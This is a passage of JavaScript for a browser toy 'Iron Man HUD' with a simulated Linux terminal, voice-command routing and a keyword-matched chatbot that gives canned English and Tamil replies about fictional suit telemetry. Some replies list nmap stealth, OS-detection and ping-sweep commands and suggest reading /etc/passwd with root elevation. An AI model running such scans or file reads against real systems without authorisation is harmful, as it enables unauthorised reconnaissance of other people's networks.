  // Virtual Filesystem Redirection / Write Helper
  saveToFile(targetPath, content, append = false) {
    let cleanPath = targetPath.replace(/['"]/g, '').trim();
    if (cleanPath.startsWith('~/')) {
      cleanPath = (this.isRoot ? '/root' : '/home/gojo') + cleanPath.slice(1);
    } else if (!cleanPath.startsWith('/')) {
      cleanPath = this.currentDir === '/' ? '/' + cleanPath : this.currentDir + '/' + cleanPath;
    }

    const segs = cleanPath.split('/').filter(Boolean);
    const fileName = segs.pop();
    const dirPath = segs.length === 0 ? '/' : '/' + segs.join('/');

    if (!this.vfs[dirPath]) {
      this.printStderr(`bash: ${targetPath}: No such file or directory`);
      this.lastExitCode = 1;
      return;
    }

    if (!this.vfs[dirPath].includes(fileName)) {
      this.vfs[dirPath].push(fileName);
    }

    if (append && this.fileContents[cleanPath]) {
      this.fileContents[cleanPath] += '\n' + content;
    } else {
      this.fileContents[cleanPath] = content;
    }
    this.fileContents[fileName] = this.fileContents[cleanPath];
    this.lastExitCode = 0;
  }

  // Voice Recognition Routing (Separates Commands from Conversational Speech)
  processVoiceInput(rawTranscript) {
    if (!rawTranscript) return;
    const text = rawTranscript.trim();
    const lower = text.toLowerCase();

    if (lower.includes('change voice') || lower.includes('switch voice') || lower.includes('next voice') || lower.includes('different voice') || lower.includes('குரலை மாற்று')) {
      if (window.FridayVoice) {
        window.FridayVoice.cycleFemaleVoice();
      }
      return;
    }

    const voiceCommands = {
      'list files': 'ls -la',
      'list directory': 'ls -la',
      'show files': 'ls -la',
      'list': 'ls',
      'who am i': 'whoami',
      'whoami': 'whoami',
      'current user': 'whoami',
      'clear terminal': 'clear',
      'clear screen': 'clear',
      'clear': 'clear',
      'system status': 'uptime',
      'uptime': 'uptime',
      'neofetch': 'neofetch',
      'system info': 'neofetch',
      'root access': 'sudo su',
      'become root': 'sudo su',
      'sudo su': 'sudo su',
      'run nmap': 'nmap -A localhost',
      'network scan': 'nmap -A localhost',
      'scan network': 'nmap -A localhost',
      'nmap scan': 'nmap -A localhost',
      'blue team': 'blueteam',
      'blueteam': 'blueteam',
      'disk usage': 'df -h',
      'memory usage': 'free -m',
      'processes': 'ps aux',
      'house party': 'houseparty',
      'veronica': 'veronica',
      'combat': 'combat',
      'stealth': 'stealth',
      'clean slate': 'cleanslate',
      'diagnostics': 'diagnostics'
    };

    let matchedCmd = voiceCommands[lower];
    if (!matchedCmd) {
      const firstWord = lower.split(/\s+/)[0];
      const valid = ['ls', 'cd', 'cat', 'pwd', 'whoami', 'uname', 'nmap', 'blueteam', 'bt', 'google', 'duck', 'wiki', 'ping', 'curl', 'clear', 'sudo', 'help', 'neofetch', 'ps', 'df', 'free', 'mic'];
      if (valid.includes(firstWord)) {
        matchedCmd = text;
      }
    }

    if (matchedCmd) {
      this.executeLinuxCommand(matchedCmd);
      if (window.FridayVoice) {
        window.FridayVoice.setSubtitle(`Executed: ${matchedCmd}`);
      }
    } else {
      this.handleVoiceConversation(text);
    }
  }

  handleVoiceConversation(userInput) {
    const clean = userInput.toLowerCase().trim();

    if (clean.includes('clean slate') || clean.includes('cleanslate') || clean.includes('அழி') || clean.includes('ക്ലീൻ സ്ലേറ്റ്')) {
      this.executeProtocol('clean_slate');
      return;
    }
    if (clean.includes('house party') || clean.includes('houseparty') || clean.includes('ஹவுஸ் பார்ட்டி') || clean.includes('ഹൗസ് പാർട്ടി')) {
      this.executeProtocol('house_party');
      return;
    }
    if (clean.includes('veronica') || clean.includes('வெரோனிகா') || clean.includes('വെറോണിക്ക')) {
      this.executeProtocol('veronica');
      return;
    }
    if (clean.includes('stealth') || clean.includes('ஸ்டெல்த்') || clean.includes('സ്റ്റെல்ത്ത്')) {
      this.executeProtocol('stealth');
      return;
    }
    if (clean.includes('combat') || clean.includes('போராட்டம்') || clean.includes('കോംബാറ്റ്')) {
      this.executeProtocol('combat');
      return;
    }
    if (clean.includes('overcharge') || clean.includes('surge') || clean.includes('பவர்')) {
      this.executeProtocol('overcharge');
      return;
    }
    if (clean.includes('diagnostic') || clean.includes('நிலை') || clean.includes('സ്റ്റാറ്റസ്')) {
      this.executeProtocol('diagnostic');
      return;
    }

    // Auto-expand chatbot column so the user visually sees their voice query and live AI response
    if (!this.chatbotOpen) {
      this.toggleChatbot(true);
    }

    // Direct all conversational voice input to the dual-brain AI engine
    this.sendChatMessage(userInput.trim());
  }

  getAIResponse(query) {
    const clean = (query || '').toLowerCase().trim();

    // ==========================================
    // Tamil Conversational Intelligence (தமிழ் உரையாடல்)
    // ==========================================
    const isTamilText = /[\u0B80-\u0BFF]/.test(clean);
    const isTamilLang = typeof window !== 'undefined' && window.FridayVoice && window.FridayVoice.currentLanguage === 'ta-IN';

    if (isTamilText || (isTamilLang && (clean.includes('vanakkam') || clean.includes('gojo') || clean.includes('arc') || clean.includes('neram')))) {
      if (clean.includes('வணக்கம்') || clean.includes('ஹலோ') || clean.includes('காலை') || clean.includes('மாலை') || clean.includes('vanakkam')) {
        return "👋 **வணக்கம் கோஜோ!** உங்கள் தமிழ் குரல் உதவியாளர் FRIDEY தயார் நிலையில் உள்ளது. அனைத்து தற்காப்பு அமைப்புகளும் முழு வீச்சில் செயல்படுகின்றன. என்ன உதவி வேண்டும்?";
      }
      if (clean.includes('ஆர்க்') || clean.includes('ரியாக்டர்') || clean.includes('பவர்') || clean.includes('மின்சாரம்') || clean.includes('சக்தி')) {
        return `⚡ **ஆர்க் ரியாக்டர் தொலை அளவியல் (Arc Telemetry):**\nவெளியீடு தற்போது **${this.telemetry.arcOutput} GW**, மைய வெப்பநிலை **${this.telemetry.coreTemp}°C**, மற்றும் ஆற்றல் செயல்திறன் **98.4%**. Gojo Enterprise மின் கட்டமைப்பு முழுமையாக இயங்குகிறது, கோஜோ.`;
      }
      if (clean.includes('கோஜோ யார்') || clean.includes('யார் கோஜோ') || clean.includes('நிறுவனர்') || clean.includes('உருவாக்கியவர்') || clean.includes('gojo yaar')) {
        return "👑 **கோஜோ** தான் **Gojo Enterprise**-ன் நிறுவனர், மாபெரும் மேதை மற்றும் அத்தியாவசிய தலைமை நிர்வாகி! **Gojo Technologes Hub** இல் இருந்து Ring-0 உயர் அதிகாரத்துடன் முழு தற்காப்பு நெட்வொர்க்கையும் வழிநடத்துகிறார்.";
      }
      if (clean.includes('நீ யார்') || clean.includes('பிரைடே யார்') || clean.includes('உன் பெயர் என்ன') || clean.includes('friday yaar')) {
        return "🤖 நான் **FRIDEY** (*Female Replacement Intelligent Digital Electronic Yield*), GOJO OS v8.4.2 இயங்குதளத்தில் செயல்படும் அயர்ன் மேன் HUD தற்காப்பு AI உதவியாளர். உங்களுக்கு தமிழ் மற்றும் ஆங்கிலத்தில் உதவ வடிவமைக்கப்பட்டுள்ளேன்.";
      }
      if (clean.includes('புளூ டீம்') || clean.includes('சைபர்') || clean.includes('பாதுகாப்பு') || clean.includes('தற்காப்பு') || clean.includes('blue team')) {
        return "🛡️ **புளூ டீம் சைபர் பாதுகாப்பு களஞ்சியம் (A-poc/BlueTeam-Tools):**\n13 தற்காப்பு பிரிவுகளில் 75+ உயர் பாதுகாப்பு கருவிகள் ஏற்றப்பட்டுள்ளன:\n• `blueteam tools` - அனைத்து பாதுகாப்பு கருவிகள் பட்டியல்\n• `blueteam hunt <indicator>` - அச்சுறுத்தல் வேட்டை (Threat Hunting)\n• `blueteam ioc <text>` - தாக்கத்தின் அறிகுறிகள் பிரித்தெடுத்தல்\n• `blueteam ir` - சம்பவ மீட்பு வழிகாட்டி\n• `blueteam tips` - கள தற்காப்பு ஆலோசனைகள்\nஇடதுபுற லினக்ஸ் டெர்மினலில் நேரடியாக இயக்கலாம்!";
      }
      if (clean.includes('என்மேப்') || clean.includes('ஸ்கேன்') || clean.includes('நெட்வொர்க்') || clean.includes('போர்ட்') || clean.includes('nmap')) {
        return "🌐 **என்மேப் (Nmap 7.94) நெட்வொர்க் ஆய்வுக்களம்:**\n• ஸ்டெல்த் ஸ்கேன்: `nmap -sS <target>`\n• சேவை பதிப்பு கண்டறிதல்: `nmap -sV -p 22,80 <target>`\n• ஓஎஸ் கண்டறிதல்: `nmap -O <target>`\n• ஆக்கிரமிப்பு தணிக்கை: `nmap -A localhost`\n• பிங் ஸ்வீப்: `nmap -sn 192.168.1.0/24`\nடெர்மினலில் நேரடியாக இயக்க முடியும்!";
      }
      if (clean.includes('வெரோனிகா') || clean.includes('ஹல்க்பஸ்டர்')) {
        return "🚀 **வெரோனிகா புரோட்டோகால் (Veronica Protocol):** சுற்றுப்பாதை ஹல்க்பஸ்டர் போர் கவசம் டெலிமெட்ரி ஆயத்தொலைவுகளில் பூட்டப்பட்டுள்ளது. கோஜோவின் உறுதிப்படுத்தல் கிடைத்ததும் இறக்கப்படும்!";
      }
      if (clean.includes('ஹவுஸ் பார்ட்டி') || clean.includes('கவசம்')) {
        return "🦾 **ஹவுஸ் பார்ட்டி புரோட்டோகால்:** நிலத்தடி பெட்டகத்தில் உள்ள 35 தன்னாட்சி நானோடெக் போர் கவசங்கள் உடனடியாக வானில் பறக்க தயாராக உள்ளன!";
      }
      if (clean.includes('கிளீன் ஸ்லேட்') || clean.includes('அழிவு') || clean.includes('சுத்தம்')) {
        return "⚠️ **கிளீன் ஸ்லேட் புரோட்டோகால்:** தற்காப்பு சுய அழிப்பு வரிசை தயாராக உள்ளது. கோஜோவின் இரட்டை பயோமெட்ரிக் உறுதிப்படுத்தல் தேவை.";
      }
      if (clean.includes('நிலை') || clean.includes('டெலிமெட்ரி') || clean.includes('சூட்') || clean.includes('ரிபல்சர்')) {
        return `📊 **கவச டெலிமெட்ரி நிலை (Suit Telemetry):**\n• கவச ஒருமைப்பாடு: **${this.telemetry.armorIntegrity}%**\n• ரிபல்சர் ஆற்றல்: **${this.telemetry.repulsorCharge}%**\n• திரஸ்டர் வெளியீடு: **${this.telemetry.thrusterOutput}%**\n• செயற்கைக்கோள் பிங்: **${this.telemetry.satellitePing}ms**`;
      }
      if (clean.includes('நேரம்') || clean.includes('மணி') || clean.includes('தேதி') || clean.includes('காலம்')) {
        const now = new Date();
        const time12Tamil = now.toLocaleTimeString('ta-IN', { hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true });
        return `🕒 தற்போதைய நேரம்: **${time12Tamil}** (${now.toLocaleDateString('ta-IN')}), கோஜோ டெக்னாலஜிஸ் ஹப் அணு தரநிலைக்கு ஒத்திசைக்கப்பட்டது.`;
      }
      if (clean.includes('நகைச்சுவை') || clean.includes('ஜோக்') || clean.includes('சிரிப்பு')) {
        return "💡 கோஜோ என்னிடம் கேட்டார்: *'நீ எப்போதாவது கிராஷ் ஆவாயா?'* நான் சொன்னேன்: *'ஆம், எதிரி பாதுகாப்பு வளையத்தில் மாக் 4 வேகத்தில் மட்டுமே!'* 😄";
      }
      if (clean.includes('நன்றி')) {
        return "மகிழ்ச்சி கோஜோ! உங்கள் சேவையில் எப்போதும் FRIDEY.";
      }
      if (clean.includes('வானிலை') || clean.includes('காற்று')) {
        return "⛅ **வளிமண்டல நிலை:** பார்வை தடையற்றது, காற்று அழுத்தம் 1013.2 hPa, காற்றின் வேகம் 12 knots. சூப்பர்சோனிக் பறப்பிற்கு உகந்த சூழல்.";
      }
      if (clean.includes('டெர்மினல்') || clean.includes('லினக்ஸ்') || clean.includes('ஷெல்')) {
        return "💻 **லினக்ஸ் பணிநிலையம்:** இடதுபுற டெர்மினல் GOJO OS v8.4.2 இல் செயல்படுகிறது. பைப்லைன்கள் (`|`), கோப்பு சேமிப்பு (`>`) மற்றும் `sudo su` மூலம் ரூட் அணுகல் பெறலாம்.";
      }
      if (clean.includes('முகவர்') || clean.includes('அலுவலகம்') || clean.includes('கேபின்') || clean.includes('ஏஜென்ட்') || clean.includes('வேலை') || clean.includes('agents')) {
        return "18 AI முகவர்கள் மற்றும் FRIDEY தலைமை மூளை அலுவலகம்:\nநான் தலைமை மூளையாக (Central Master Brain - AGENT-00) செயல்பட்டு 18 தன்னாட்சி AI முகவர்களை (AGENT-01 முதல் AGENT-18) நிர்வகிக்கிறேன். இடதுபுற 3D விர்ச்சுவல் அலுவலகத்தில் ஒவ்வொருவருக்கும் தனித்தனி கேபின்கள், பிரத்யேக மேசைகள், ஒளிரும் மடிக்கணினிகள் மற்றும் மனித உடல் அனிமேஷன்கள் உள்ளன:\n• குறியீட்டு வல்லுநர்கள் (5 பேர்): AGENT-01, AGENT-02, AGENT-03, AGENT-04, AGENT-05\n• சைபர் பாதுகாப்பு தற்காப்பு (4 பேர்): AGENT-06, AGENT-07, AGENT-08, AGENT-09\n• ஆழ்ந்த பகுப்பாய்வு & AI (4 பேர்): AGENT-10, AGENT-11, AGENT-12, AGENT-13\n• கணினி இயக்கம் & ஆட்டோமேஷன் (5 பேர்): AGENT-14, AGENT-15, AGENT-16, AGENT-17, AGENT-18\n\nமனித உடல் இயக்கங்கள்: நடைப்பயிற்சி (Walking Animation), அதிவேக தட்டச்சு வேலை (Working Typing), மடிக்கணினி கையாளுதல் (Laptop Handling & Screen Tilting), மற்றும் முகவர்களுக்கிடையேயான நேரடி கூட்டுப்பணி (Collaboration Laser Beam). இடதுபுற 3D கேபினை கிளிக் செய்து அல்லது டெர்மினலில் `agents assign` / `agents collab` மூலம் கட்டளை இடலாம்!";
      }

      return `💡 கோஜோ, உங்கள் கேள்வி பெறப்பட்டது: "${this.escapeHTML(query)}". அனைத்து கணினி துணை அமைப்புகளும் இயல்பு நிலையில் உள்ளன. என்ன கட்டளை இட விரும்புகிறீர்கள்?`;
    }

    if (clean.includes('change voice') || clean.includes('switch voice') || clean.includes('different voice') || clean.includes('female voice')) {
      if (typeof window !== 'undefined' && window.FridayVoice && typeof window.FridayVoice.cycleFemaleVoice === 'function') {
        const v = window.FridayVoice.cycleFemaleVoice();
        return `🎙️ **Voice Profile Updated:** Vocal matrix switched to **${v ? v.name : 'Samantha'}**.`;
      }
      return "🎙️ Voice synthesizer switched to new female profile.";
    }

    if (clean.includes('character reference') || clean.includes('character') || clean.includes('characters') || clean.includes('refference') || clean.includes('reference') || clean.includes('studio')) {
      const fleet = window.FridayAgents;
      if (fleet && typeof fleet.setOfficeView === 'function') {
        fleet.setOfficeView('refs');
      }
      return "🎨 **FRIDAY Character & Workstation Studio Loaded:**\n• **Solo Workstation Reference:** Features individual agent character modeling at their dedicated desk, custom computer monitor, live telemetry, and city view.\n• **3D Virtual Office Floor Reference:** Minimalist open-plan architecture with panoramic window mullions, structured workstation rows, and perimeter office plants.\n• **Multi-Agent Collaboration Hub Reference:** Dual-agent synchronization with animated speech bubbles (data packet transfer & telemetry documentation).\n\nSwitched the Office HUD on the left to **REFS** mode so you can interact with the live Character Reference Studio!";
    }

    if (clean.includes('agent') || clean.includes('fleet') || clean.includes('18') || clean.includes('office') || clean.includes('cabin') || clean.includes('laptop') || clean.includes('desk') || clean.includes('assign work') || clean.includes('manage')) {
      return "FRIDEY Apex Brain & 18 Autonomous AI Agents Office:\nAs the central neural Master Brain (AGENT-00), I orchestrate 18 specialist AI agents stationed in our 3D cyber-office on the left:\n• Coding & Engineering (5 Cabins): AGENT-01, AGENT-02, AGENT-03, AGENT-04, AGENT-05 (Next.js, Rust, WebGL, K8s, Solidity)\n• Cyber Defense & Security (4 Cabins): AGENT-06, AGENT-07, AGENT-08, AGENT-09 (SIEM, Metasploit, Reverse-Engineering, Zero-Trust)\n• Deep Analytics & Intelligence (4 Cabins): AGENT-10, AGENT-11, AGENT-12, AGENT-13 (PyTorch, MITRE ATT&CK, Monte Carlo, RAG)\n• Autonomous Systems & Ops (5 Cabins): AGENT-14, AGENT-15, AGENT-16, AGENT-17, AGENT-18 (eBPF, ScyllaDB, OSINT, SRE, Automated QA)\n\nEvery agent features a procedural 3D human body with dynamic animations: walking strides with footstep ripples, high-speed typing work, laptop chassis handling with screen tilting, and collaborative laser data-bus links connecting paired agents. Click any cabin in the 3D office or run `agents list`, `agents assign <id> <task>`, or `agents collab <id1> <id2>` in the terminal!";
    }

    if (clean.includes('arc') || clean.includes('reactor') || clean.includes('power')) {
      return `⚡ Arc Reactor telemetry: Output is currently **${this.telemetry.arcOutput} GW**, Core Temperature **${this.telemetry.coreTemp}°C**, and efficiency **98.4%**. Power grid is operating in nominal parameters.`;
    }
    if (clean.includes('who made you') || clean.includes('founder') || clean.includes('creator') || clean.includes('who engineered you')) {
      return "👑 I was designed and engineered by **GOJO**, Supreme Superuser and Founder of **Gojo Enterprise**.";
    }
    if (clean.includes('who is gojo') || clean.includes('about gojo')) {
      return "👑 **GOJO** is the visionary Architect and Founder of **Gojo Enterprise**, operating from **Gojo Technologes Hub** with Ring-0 administrative authority.";
    }
    if (clean.includes('who are you') || clean.includes('what are you') || clean.includes('what is fridey')) {
      return "🤖 I am **FRIDEY** (*Female Replacement Intelligent Digital Electronic Yield*), an Iron Man HUD tactical AI assistant running on GOJO OS v8.4.2.";
    }
    if (clean.includes('joke')) {
      return "💡 Gojo asked me if I ever crash. I answered: *only into enemy defense grids at Mach 4.*";
    }
    if (clean.includes('status') || clean.includes('telemetry') || clean.includes('diagnostic')) {
      return `📊 **Telemetry Status:**\n• Armor Integrity: **${this.telemetry.armorIntegrity}%**\n• Repulsor Charge: **${this.telemetry.repulsorCharge}%**\n• Thruster Output: **${this.telemetry.thrusterOutput}%**\n• Satellite Ping: **${this.telemetry.satellitePing}ms**`;
    }
    if (clean.includes('nmap') || clean.includes('scan') || clean.includes('recon')) {
      return "🌐 **Nmap 7.94 Reconnaissance Suite:**\n• SYN Stealth: `nmap -sS <target>`\n• Service Versions: `nmap -sV -p 22,80 <target>`\n• OS Detection: `nmap -O <target>`\n• Aggressive Audit: `nmap -A localhost`\n• Ping Sweep: `nmap -sn 192.168.1.0/24`\nYou can run any of these directly in the Linux Terminal on the left!";
    }
    if (clean.includes('blueteam') || clean.includes('blue team') || clean.includes('defense') || clean.includes('cyber')) {
      return "🛡️ **Blue Team Cyber Defense Repository (A-poc/BlueTeam-Tools):**\nLoaded with 75+ tools across 13 defensive domains:\n• List tools: `blueteam tools [category]`\n• Threat Hunting: `blueteam hunt <indicator>`\n• IOC Extraction: `blueteam ioc <text>`\n• Incident Response: `blueteam ir`\n• Field Defense Tips: `blueteam tips`";
    }
    if (clean.includes('veronica') || clean.includes('hulkbuster')) {
      return "🚀 **Veronica Protocol:** Orbital deployable Hulkbuster combat frame is locked onto telemetry coordinates. Ready for deployment on your command.";
    }
    if (clean.includes('house party') || clean.includes('houseparty')) {
      return "🦾 **House Party Protocol:** 35 autonomous nanotech combat armors standing by in the subterranean vault. Rapid deployment primed.";
    }
    if (clean.includes('clean slate') || clean.includes('cleanslate')) {
      return "⚠️ **Clean Slate Protocol:** Self-destruct neutralization sequence primed. Requires two-factor biometric confirmation from Gojo.";
    }
    if (clean.includes('combat') || clean.includes('surge') || clean.includes('stealth')) {
      return "⚔️ **Tactical Mode:** Nanotech armor hardened to 100%, repulsor coils synchronized, and kinetic shielding energized.";
    }
    if (clean.includes('time') || clean.includes('date') || clean.includes('clock')) {
      const now = new Date();
      const timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true });
      return `🕒 Workstation Clock: **${timeStr}** (${now.toDateString()}), synchronized to Gojo Technologes Hub atomic standard.`;
    }
    if (clean.includes('weather') || clean.includes('atmosphere')) {
      return "⛅ **Atmospheric Telemetry:** Stratospheric visibility unlimited, barometric pressure 1013.2 hPa, headwind 12 knots. Optimal conditions for supersonic flight.";
    }
    if (clean.includes('linux') || clean.includes('terminal') || clean.includes('bash') || clean.includes('shell')) {
      return "💻 **Linux Terminal Workstation:** The terminal on the left runs GNU bash / zsh on GOJO OS v8.4.2. It supports multi-stage pipelines (`cat /etc/passwd | grep root`), file redirection (`echo 'test' > test.txt`), and superuser privilege elevation with `sudo su`.";
    }
    if (clean.includes('hello') || clean.includes('hey') || clean.includes('hi fridey') || clean.includes('good morning')) {
      return "👋 Good day, Gojo. Tactical neural matrix is online and linked to telemetry. How can I assist you?";
    }
    if (clean.includes('thank') || clean.includes('thanks')) {
      return "You're welcome, Gojo. Always at your service.";
    }

    return `💡 Query processed for: "${this.escapeHTML(query)}". All suit subroutines and neural parameters are nominal, Gojo. Feel free to ask about suit telemetry, defense tools, Linux commands, or tactical protocols.`;
  }

  // ==========================================
  // Foldable AI Chatbot ("ASK ANYTHING") Controller
  // ==========================================
  toggleChatbot(forceOpen = null) {
    if (forceOpen !== null) {
      this.chatbotOpen = forceOpen;
    } else {
      this.chatbotOpen = !this.chatbotOpen;
    }

    if (this.colChatbot) {
      this.colChatbot.classList.toggle('is-folded', !this.chatbotOpen);
    }
    if (this.chatbotFoldedRibbon) {
      this.chatbotFoldedRibbon.classList.toggle('visible', !this.chatbotOpen);
    }
    if (this.btnToggleChatbot) {
      this.btnToggleChatbot.classList.toggle('active', this.chatbotOpen);
    }
    if (window.FridayAudio) window.FridayAudio.playClick();
    this.showToast(this.chatbotOpen ? 'Chatbot Column: EXPANDED' : 'Chatbot Column: FOLDED');
    if (this.chatbotOpen && this.chatInput) {
      setTimeout(() => this.chatInput.focus(), 150);
    }
  }

  sendChatMessage(rawText) {
    const text = (rawText || '').trim();
    if (!text) return;

    if (this.chatInput) {
      this.chatInput.value = '';
    }

    // 1. Append User Message
    this.appendUserChatMessage(text);
    if (window.FridayAudio) window.FridayAudio.playKeypress();

    // 2. Realistic Typing / Neural Thinking Indicator
    const typingId = this.showChatbotTyping();

    // 3. Generate Rich AI Response
    setTimeout(() => {
      this.removeChatbotTyping(typingId);
      const reply = this.getAIResponse(text);
      this.appendAssistantChatMessage(reply);

      if (window.FridayAudio) window.FridayAudio.playNotice();
      if (window.FridayVoice) {
        window.FridayVoice.speak(reply);
        window.FridayVoice.setSubtitle(reply);
      }
    }, 280);
  }

  appendUserChatMessage(text) {
    if (!this.chatMessagesStream) return;
    const timeStr = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
    const msgEl = document.createElement('div');
    msgEl.className = 'chat-msg chat-user-msg';
    msgEl.innerHTML = `
      <div class="user-avatar-icon" title="GOJO">G</div>
      <div class="msg-content-wrapper">
        <div class="msg-sender">GOJO <span class="msg-time">${timeStr}</span></div>
        <div class="msg-bubble">${this.escapeHTML(text)}</div>
      </div>
    `;
    this.chatMessagesStream.appendChild(msgEl);
    this.chatMessagesStream.scrollTop = this.chatMessagesStream.scrollHeight;
  }

  getAssistantAvatarHTML() {
    return `<div class="msg-avatar msg-avatar-ai" title="FRIDEY AI Core">
      <svg class="msg-avatar-svg" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="16" cy="16" r="14" stroke="currentColor" stroke-width="1.5" stroke-dasharray="3 2"/>
        <circle cx="16" cy="16" r="8" fill="currentColor" fill-opacity="0.25" stroke="currentColor" stroke-width="1.2"/>
        <polygon points="16,11 20.5,19 11.5,19" stroke="currentColor" stroke-width="1" fill="none"/>
        <circle cx="16" cy="16" r="2.5" fill="currentColor"/>
      </svg>
    </div>`;
  }

  appendAssistantChatMessage(text) {
    if (!this.chatMessagesStream) return;
    const timeStr = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true });
    const msgEl = document.createElement('div');
    msgEl.className = 'chat-msg chat-assistant-msg';
    msgEl.innerHTML = `
      ${this.getAssistantAvatarHTML()}
      <div class="msg-content-wrapper">
        <div class="msg-sender">FRIDEY A.I. <span class="msg-time">${timeStr}</span></div>
        <div class="msg-bubble">${this.formatChatMarkdown(text)}</div>
      </div>
    `;
    this.chatMessagesStream.appendChild(msgEl);
    this.chatMessagesStream.scrollTop = this.chatMessagesStream.scrollHeight;
  }

  showChatbotTyping() {
    if (!this.chatMessagesStream) return null;
    const id = 'typing_' + Date.now();
    const typingEl = document.createElement('div');
    typingEl.className = 'chat-msg chat-assistant-msg';
    typingEl.id = id;
    typingEl.innerHTML = `
      ${this.getAssistantAvatarHTML()}
      <div class="msg-content-wrapper">
        <div class="msg-sender">FRIDEY A.I. <span class="msg-time">THINKING...</span></div>
        <div class="msg-bubble" style="color:var(--theme-primary); font-style:italic;">
          <span style="opacity: 0.85;">● ● ● Neural matrix processing...</span>
        </div>
      </div>
    `;
    this.chatMessagesStream.appendChild(typingEl);
    this.chatMessagesStream.scrollTop = this.chatMessagesStream.scrollHeight;
    return id;
  }

  removeChatbotTyping(id) {
    if (!id) return;
    const el = document.getElementById(id);
    if (el && el.parentNode) {
      el.parentNode.removeChild(el);
    }
  }

  clearChatHistory() {
    if (!this.chatMessagesStream) return;
    this.chatMessagesStream.innerHTML = `
      <div class="chat-msg chat-assistant-msg">
        ${this.getAssistantAvatarHTML()}
        <div class="msg-content-wrapper">
          <div class="msg-sender">FRIDEY A.I. <span class="msg-time">ONLINE</span></div>
          <div class="msg-bubble">
            Chat history reset. Tactical neural network standing by, Gojo. What would you like to ask?
          </div>
        </div>
      </div>
    `;
    if (window.FridayAudio) window.FridayAudio.playClick();
    this.showToast('Chat History Cleared');
  }

  formatChatMarkdown(text) {
    if (!text) return '';
    let out = this.escapeHTML(text);

    // Markdown tables: convert lines starting and ending with | to HTML table
    const lines = out.split('\n');
    let inTable = false;
    let tableHtml = '';
    const processedLines = [];

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i].trim();
      if (line.startsWith('|') && line.endsWith('|')) {
        // Table separator row: |--|--|
        if (line.match(/^\|(?:\s*:?-+:?\s*\|)+$/)) {
          continue;
        }
        const cells = line.split('|').slice(1, -1);
        if (!inTable) {
          inTable = true;
          tableHtml = '<table><thead><tr>' + cells.map(c => `<th>${c.trim()}</th>`).join('') + '</tr></thead><tbody>';
        } else {
          tableHtml += '<tr>' + cells.map(c => `<td>${c.trim()}</td>`).join('') + '</tr>';
        }
      } else {
        if (inTable) {
          inTable = false;
          tableHtml += '</tbody></table>';
          processedLines.push(tableHtml);
          tableHtml = '';
        }
        processedLines.push(line);
      }
    }
    if (inTable) {
      tableHtml += '</tbody></table>';
      processedLines.push(tableHtml);
    }

    out = processedLines.join('\n');

    // Headers
    out = out.replace(/^###\s+(.+)$/gm, '<h3>$1</h3>');
    out = out.replace(/^##\s+(.+)$/gm, '<h3>$1</h3>');
    out = out.replace(/^#\s+(.+)$/gm, '<h3>$1</h3>');

    // Bold & code
    out = out.replace(/`([^`]+)`/g, '<code>$1</code>');
    out = out.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
    out = out.replace(/(https?:\/\/[^\s]+)/g, '<a href="$1" target="_blank" class="term-link">$1</a>');

    // Bullet points
    out = out.replace(/^\s*-\s+(.+)$/gm, '• $1');

    // Line breaks (except around table & header tags)
    out = out.replace(/\n/g, '<br>');
    out = out.replace(/<\/table><br>/g, '</table>');
    out = out.replace(/<\/h3><br>/g, '</h3>');
    return out;
  }

  // ==========================================
  // Tamil Voice Chat (தமிழ் குரல் உரையாடல்) Controller
  // ==========================================
  activateTamilVoiceChat() {
    if (!window.FridayVoice) return;

    // 1. Switch language to Tamil in voice engine and dropdowns
    window.FridayVoice.setLanguage('ta-IN');
    const langSelect = document.getElementById('langSelect');
    if (langSelect) langSelect.value = 'ta-IN';
    const drawerLangSelect = document.getElementById('drawerLangSelect');
    if (drawerLangSelect) drawerLangSelect.value = 'ta-IN';

    // 2. Visual active state on Tamil button and chips
    const btnTamil = document.getElementById('btnTamilVoiceChat');
    if (btnTamil) btnTamil.classList.add('active');
    const chipTamil = document.getElementById('chipToggleTamil');
    if (chipTamil) chipTamil.classList.add('active');

    // 3. Ensure Chatbot column is unfolded
    if (!this.chatbotOpen) {
      this.toggleChatbot(true);
    }

    // 4. Post Welcome Greeting in Tamil into Chatbot Stream
    const tamilGreeting = "வணக்கம் கோஜோ! 🇮🇳 **தமிழ் குரல் உரையாடல் முறைமை (Tamil Voice Chat)** வெற்றிகரமாக செயல்படுத்தப்பட்டது.\nமைக்ரோஃபோன் வழியாக உங்கள் கேள்விகளைக் கேட்கலாம் அல்லது கீழேயுள்ள தமிழ் தலைப்புகளைத் தேர்ந்தெடுக்கலாம்!";
    this.appendAssistantChatMessage(tamilGreeting);

    // 5. Vocal output in female Tamil voice
    if (window.FridayAudio) window.FridayAudio.playNotice();
    window.FridayVoice.speak("வணக்கம் கோஜோ! தமிழ் குரல் உரையாடல் முறைமை தயார் நிலையில் உள்ளது. என்ன உதவி வேண்டும்?");
    window.FridayVoice.setSubtitle("🇮🇳 தமிழ் குரல் உரையாடல் தயார்...");

    // 6. Ensure microphone is unmuted and activate recognition
    setTimeout(() => {
      window.FridayVoice.setMicMuted(false);
      if (!window.FridayVoice.isListening) {
        window.FridayVoice.toggleListening();
      }
    }, 600);

    this.showToast('🇮🇳 தமிழ் வாய்ஸ் சாட் செயல்படுத்தப்பட்டது (Tamil Voice Chat Active)');
  }

  // ==========================================
  // Tactical Swipe Mic Off/On Switch Controller
  // ==========================================
  initSwipeMicToggle() {
    const track = document.getElementById('swipeMicTrack');
    const knob = document.getElementById('swipeMicKnob');
    const label = document.getElementById('swipeMicText');
    if (!track || !knob) return;

    let isDragging = false;
    let startX = 0;
    let dragDist = 0;

    const isMicActive = () => {
      if (!window.FridayVoice) return false;
      return !window.FridayVoice.isMicMuted && !window.FridayVoice.isMicBlockedTemporarily && (window.FridayVoice.isListening || window.FridayVoice.isMicHardwareActive);
    };

    const updateKnobUI = (active) => {
      track.classList.toggle('is-active', !!active);
      track.classList.toggle('is-muted', !active);
      track.setAttribute('aria-checked', active ? 'true' : 'false');
      knob.style.transform = '';
      if (label) {
        label.textContent = active ? '◄ SWIPE MIC OFF' : 'MIC OFF • SWIPE ON ►';
      }
    };

    // Global sync function for voice.js to invoke on state transitions
    window.syncSwipeMicUI = (active) => {
      updateKnobUI(active);
